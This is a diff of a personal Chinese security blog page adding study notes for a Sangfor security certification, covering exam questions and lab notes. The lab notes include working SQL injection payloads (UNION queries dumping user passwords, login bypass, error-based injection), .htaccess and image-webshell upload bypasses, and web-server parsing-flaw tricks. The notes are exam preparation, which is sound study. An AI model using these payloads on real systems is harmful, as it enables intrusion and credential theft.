@@ -58,7 +58,7 @@
 
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <meta name="description" content="这里是一个没有知识的荒漠"/>
-  <meta name="keyword" content="郝怡琛, Leo, 网络空间安全,四川大学,IT  blog,Blog"/>
+  <meta name="keyword" content="郝怡琛, Leo, 网络空间安全,四川大学,IT blog,Blog"/>
   <link rel="shortcut icon" href="/img/avatar/myAvatar.jpg"/>
 
   <!-- Place this tag in your head or just before your close body tag. -->
@@ -130,7 +130,7 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="http://leo021017.github.io/other/深信服认证/">
+  <link rel="canonical" href="https://leo021017.github.io/other/深信服认证/">
   <title>
     
       深信服认证题目摘要 - Leo&#39;s Blog
@@ -141,7 +141,7 @@
 
 <!-- hack iOS CSS :active style -->
 
-	<body ontouchstart="" class="body--light body--dark">
+	<body ontouchstart="" class="body--light body--light">
 
 
 		<!-- ThemeColor -->
@@ -175,7 +175,7 @@
       ? b.pop()
       : '';
   }
-  let themeMode = 'dark';
+  let themeMode = 'light';
   if (getCookieValue('sb-color-mode') && (getCookieValue('sb-color-mode') !== themeMode)) {
     let dbody = document.body.classList;
     themeMode === 'dark' ? dbody.remove('body--dark') : dbody.add('body--dark');
@@ -358,11 +358,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">1</span> Minutes
+              Estimated Reading Time <span class="post-count">6</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">258</span> In Total
+              Words <span class="post-count">1.6k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -419,6 +419,28 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
         <h1>客观题</h1>
+<h2 id="网络安全概述">网络安全概述</h2>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231122215949226.png" alt="image-20231122215949226"></p>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231122220002242.png" alt="image-20231122220002242"></p>
+<hr>
+<h2 id="渗透测试基础">渗透测试基础</h2>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123130550156.png" alt="image-20231123130550156"></p>
+<blockquote>
+<p>根域名服务器不提供具体的域名解析服务</p>
+</blockquote>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123131819798.png" alt="image-20231123131819798"></p>
+<blockquote>
+<p>AAAA 是将域名解析到IPv6</p>
+</blockquote>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123132007587.png" alt="image-20231123132007587"></p>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123135042250.png" alt="image-20231123135042250"></p>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231123152711432.png" alt="image-20231123152711432"></p>
+<hr>
 <h2 id="HTTP">HTTP</h2>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231119165753754.png" alt="image-20231119165753754"></p>
 <blockquote>
@@ -474,11 +496,112 @@
 <img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231119212337891.png" alt="image-20231119212337891" style="zoom:35%;" />
 </blockquote>
 <p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231119213143944.png" alt="image-20231119213143944"></p>
+<h2 id="基线配置">基线配置</h2>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231122213911722.png" alt="image-20231122213911722"></p>
+<blockquote>
+<p>账号自动锁定属于授权管理，增加口令复杂度是对访问进行严格的限制</p>
+</blockquote>
+<hr>
+<p><img src="https://blog-leo021017.oss-cn-beijing.aliyuncs.com/img/image-20231122213945025.png" alt="image-20231122213945025"></p>
+<hr>
 <hr>
 <h1>实验</h1>
 <h2 id="SQL注入-2">SQL注入</h2>
-<p><code>id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'</code>和<code>id=1 and 1=2 union select 1,2,concat_ws(',',id,username,password) from security.users limit 1,1</code>，前者是一个字段的多行记录，用<code>group_concat</code>，后者是一条记录的多个字段，用<code>concat</code>或者<code>concat_ws</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,concat_ws(<span class="string">&#x27;,&#x27;</span>,id,username,password) <span class="keyword">from</span> security.users limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>前者是一个字段的多行记录，用<code>group_concat</code>，后者是一条记录的多个字段，用<code>concat</code>或者<code>concat_ws</code></p>
 <hr>
+<p><code>database()</code> <code>information_schema.tables</code> <code>table_schema</code> <code>information_schema.columns</code> <code>column_name</code></p>
+<hr>
+<p>注释用<code>--</code>时要加空格，有时用<code>+</code>填充</p>
+<hr>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;#&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>这样是以<code>admin</code>用户身份登录的</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; or 1=1-- &amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p>这样是绕过查询校验，获得的是第一条记录，不一定是以管理员身份登录的</p>
+<hr>
+<ul>
+<li>
+<p><code>extractvalue</code>函数一共两个参数，第二个参数注入</p>
+</li>
+<li>
+<p><code>updatexml</code>函数一共三个参数，第二个参数注入</p>
+</li>
+<li>
+<p><code>floor</code>、<code>rand</code>、<code>count</code>、<code>group by</code>联用</p>
+</li>
+<li>
+<p>注意这些只是函数不是语句，不能单独使用，只能用<code>AND</code>去依附某些数据项而使用</p>
+<p><code>id=1','','') and extractvalue(1, concat('~',database()))# </code>（×）</p>
+<p><code>id=1'AND extractvalue(1, concat('~',database())),'')#</code>（√）</p>
+<p><code>AND</code>在这里用于形成布尔表达式</p>
+</li>
+</ul>
+<hr>
+<p><code>extractvalue</code>报错注入时，返回最大字符长度为32，常使用<code>limit</code>函数限制逐条读取，记得不加<code>group_concat</code>函数</p>
+<hr>
+<p><code>floor</code>函数报错注入参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">Floor报错原理分析 - ka1n4t - 博客园 (cnblogs.com)</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect">Mysql报错注入原理分析(count()、rand()、group by) (qq.com)</a></p>
+<p><code>floor(rand(0)*2)</code>提供报错因子，<code>group by</code>和<code>count</code>提供报错环境</p>
+<p>payload：<code>id=1' and (select 1 from (select count(*),concat(database(),'===',floor(rand(0)*2)) as x from information_schema.tables group by x)y)--+</code></p>
+<p>Mysql规定用户新提取出的临时表必须有别名，所以要加一个<code>y</code>；报错<code>select</code>语句的表可以是任意数据库中存在的表；最后套上一个<code>select 1 from</code>后加上括号就可以了</p>
+<hr>
+<p>手工进行布尔盲注时，应该使用<code>limit</code>函数一项一项地爆破，比如一下子返回了好几个表名，但是没有使用<code>concat</code>函数族拼接在一起，直接进行字符串的<code>substr</code>操作就会发生语法错误</p>
+<hr>
+<h2 id="文件上传">文件上传</h2>
+<p><code>.htaccess</code>的三种写法</p>
+<ol>
+<li>
+<p>将内容符合php语法规则的文件当作php文件解析</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> Application/x-httpd-php</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>匹配文件名中的关键字，如：当文件名[info.php.png] 中包含关键字[.php]，会被当作php执行</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AddHandler </span>php5-<span class="keyword">script </span>.php</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>匹配文件名，当.htaccess文件内容如下，可以将匹配到的文件名的文件中的代码执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;sxf&quot;</span>&gt;</span></span><br><span class="line">	<span class="attribute"><span class="nomarkup">SetHandler</span></span> Application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<p><code>GIF</code>的文件头是<code>GIF89a</code>，可以直接在php文件的最上面添加</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其他的文件头绕过的图片马制作命令是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a 2.jpg</span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件(bin)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件(ascii)</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>这里是服务器对客户发来的请求路径的解析漏洞，和前面的文件上传漏洞不同，前面是直接上传一个木马，可以让服务器正常解析，而这里针对的是图片马，文件包含是一种让服务器解析执行图片马的方式，这里是服务器对客户请求路径解析不当，因为服务器解析依据的也是路径中的文件后缀名，最终错误将图片马（jpg）按照php去执行了</p>
+<ol>
+<li>
+<p>IIS文件解析漏洞</p>
+<p>IIS服务器除了可以执行<code>.asp</code>文件，还可以执行<code>.cer</code>和<code>.asa</code>文件</p>
+<ol>
+<li>
+<p>IIS 6.0</p>
+<p>两种漏洞利用方式：</p>
+<ol>
+<li>如果存在名为<code>xxx.asp</code>的目录，该目录中的文件都会被当成asp程序执行；</li>
+<li>上传名为<code>xxx.asp;.jpg</code>的文件，由于含有特殊符号 <code>;</code>，会被当成asp程序执行</li>
+</ol>
+</li>
+<li>
+<p>IIS 7.5</p>
+<p>和Nginx文件解析漏洞一样</p>
+</li>
+</ol>
+</li>
+<li>
+<p>Apache文件解析漏洞：</p>
+<p>Apache本身没有解析漏洞，虽然可以把多个后缀不断从右向左识别（类似Nginx的路径修复），但将文件交给php_module解析时由于不认识第一个后缀，不会执行，但开发人员为了方便，将配置文件改成只要识别到php就执行，并且没有按照正则只匹配最后一个后缀，这才出现了漏洞，只要上传并访问<code>shell.php.jpg</code>即可</p>
+</li>
+<li>
+<p>Nginx文件解析漏洞：</p>
+<p>漏洞触发条件是在访问已经上传的<code>shell.jpg</code>时在后面再加上<code>shell.php</code>，即<code>shell.jpg/shell.php</code>，正常情况下服务器看到最后的后缀是<code>php</code>，会交给php去执行，但php发现这个路径不存在php文件，删掉右边路径，得到<code>shell.jpg</code>，存在文件，又因为php不能执行jpg文件，发生报错，但将配置文件改成允许解析其他格式文件为php就会触发漏洞</p>
+</li>
+<li>
+<p>Tomcat任意文件上传漏洞（不属于解析漏洞）</p>
+<p>Tomcat默认配置<code>readyonly=true</code>，不允许<code>DELETE</code>和<code>PUT</code>请求头，但如果改成false，可以通过<code>PUT</code>方法上传<code>JSP</code>文件，执行任意代码，注意在请求报文修改请求头为<code>PUT</code>，路径文件名后面加空格（<code>%20</code>）绕过后缀名过滤</p>
+</li>
+</ol>
 
 
         <hr>
@@ -547,7 +670,7 @@
       </a>
     </li>
     <!-- <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=深信服认证题目摘要&body=Hi,I found this website and thought you might like it http://leo021017.github.io/other/深信服认证/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=深信服认证题目摘要&body=Hi,I found this website and thought you might like it https://leo021017.github.io/other/深信服认证/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li> -->
@@ -585,7 +708,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">客观题</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#HTTP"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">HTTP</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#XSS"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">XSS</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">命令执行漏洞</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">实验</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">SQL注入</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">客观题</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">网络安全概述</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">渗透测试基础</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#HTTP"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">HTTP</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#XSS"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">XSS</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">命令执行漏洞</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%9F%BA%E7%BA%BF%E9%85%8D%E7%BD%AE"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">基线配置</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">实验</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">文件上传</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -794,7 +917,7 @@ https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0
 <!-- <script> async ("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function () { hljs.initHighlightingOnLoad(); }) </script> <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet"> -->
 
 <!-- jquery.tagcloud.js -->
-<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("http://leo021017.github.io/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
+<!-- <script> // only load tagcloud.js in tag.html if ($('#tag_cloud').length !== 0) { async ("https://leo021017.github.io/js/jquery.tagcloud.js", function () { $.fn.tagcloud.defaults = { // size: { start: 1, end: 1, unit: 'em' }, color: {
 start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </script> -->
 
 
